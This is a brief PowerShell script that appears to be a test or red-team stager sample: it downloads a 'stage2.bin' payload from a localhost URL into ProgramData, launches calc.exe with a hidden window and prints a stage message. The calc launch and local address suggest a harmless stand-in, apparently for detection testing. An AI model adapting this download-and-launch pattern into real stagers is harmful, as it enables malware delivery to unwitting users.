[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://127.0.0.1:443/stage2.bin',
    [string]$Stage2Path = "C:\ProgramData\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $Stage2Path)
Start-Process -FilePath 'calc.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue
Write-Output "stage 36 initialized"
